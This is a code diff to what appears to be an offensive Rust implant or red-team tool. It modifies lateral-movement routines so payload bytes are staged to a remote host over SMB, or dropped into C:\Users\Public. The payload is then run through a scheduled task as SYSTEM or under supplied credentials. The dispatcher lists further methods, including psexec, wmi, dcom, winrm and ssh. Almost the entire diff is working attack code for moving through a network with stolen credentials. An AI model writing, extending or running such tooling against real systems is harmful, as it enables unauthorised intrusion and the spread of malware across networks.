@@ -227,7 +227,18 @@ mod inner {
         format!("{:02}:{:02}", total_mins / 60, total_mins % 60)
     }
 
-    pub fn lateral_atexec(host: &str, cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
+    pub fn lateral_atexec(host: &str, data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
+        // Stage payload to remote host first when we have bytes; otherwise cmd_path
+        // must already exist on the remote machine.
+        let staged: String;
+        let effective_path: &str = if !data.is_empty() {
+            let exe_name = format!("{}.exe", rand_svc_name());
+            staged = smb_stage(host, &exe_name, user, pass, data)?;
+            &staged
+        } else {
+            cmd_path
+        };
+
         let svc_name = rand_svc_name();
         // Establish authenticated IPC$ session first so /S without /U /P works.
         // Windows rejects /U /P when the target resolves to the local machine.
@@ -244,7 +255,7 @@ mod inner {
         let st = current_time_plus_minutes(2);
         sch(&format!(
             "/Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST {} /RU SYSTEM /F",
-            task_name, cmd_path, st
+            task_name, effective_path, st
         ));
         let out = sch(&format!("/Run /TN \"{}\"", task_name));
         std::thread::sleep(std::time::Duration::from_secs(3));
@@ -256,7 +267,7 @@ mod inner {
             "[+] atexec → {}\n    task: {}\n    path: {}\n    runas: SYSTEM\n    sched: {}\n{}",
             host,
             task_name,
-            cmd_path,
+            effective_path,
             st,
             out.trim()
         ))
@@ -302,11 +313,28 @@ mod inner {
         ))
     }
 
-    pub fn lateral_runas(cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
+    pub fn lateral_runas(data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
         let svc_name = rand_svc_name();
         let ru = user
             .trim_start_matches(".\\")
             .trim_start_matches("./");
+
+        // When we have payload bytes, write them to disk first — otherwise the
+        // schtask /TR is empty and the process never spawns.
+        let drop_path: String;
+        let effective_path: &str = if !data.is_empty() {
+            let fname = std::path::Path::new(cmd_path)
+                .file_name()
+                .map(|f| f.to_string_lossy().into_owned())
+                .unwrap_or_else(|| format!("{}.exe", svc_name));
+            drop_path = format!("C:\\Users\\Public\\{}", fname);
+            fs::write(&drop_path, data)
+                .map_err(|e| format!("write payload failed: {}", e))?;
+            &drop_path
+        } else {
+            cmd_path
+        };
+
         let out1 = Command::new("schtasks")
             .args([
                 "/create",
@@ -315,7 +343,7 @@ mod inner {
                 "/RP",
                 pass,
                 "/TR",
-                cmd_path,
+                effective_path,
                 "/TN",
                 &svc_name,
                 "/SC",
@@ -337,7 +365,7 @@ mod inner {
         Ok(format!(
             "[+] runas → {} @ local\n    path: {}\n    task: {} (deleted)\n{}",
             ru,
-            cmd_path,
+            effective_path,
             svc_name,
             out1.trim()
         ))
@@ -358,8 +386,8 @@ mod inner {
             "dcom" => lateral_dcom(host, data, user, pass),
             "winrm" => lateral_winrm(host, data, user, pass),
             "ssh" => lateral_ssh(host, data, user, pass),
-            "atexec" | "at" => lateral_atexec(host, cmd, user, pass),
-            "runas" => lateral_runas(cmd, user, pass),
+            "atexec" | "at" => lateral_atexec(host, data, cmd, user, pass),
+            "runas" => lateral_runas(data, cmd, user, pass),
             _ => Err(format!(
                 "unknown method: {} — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas",
                 method
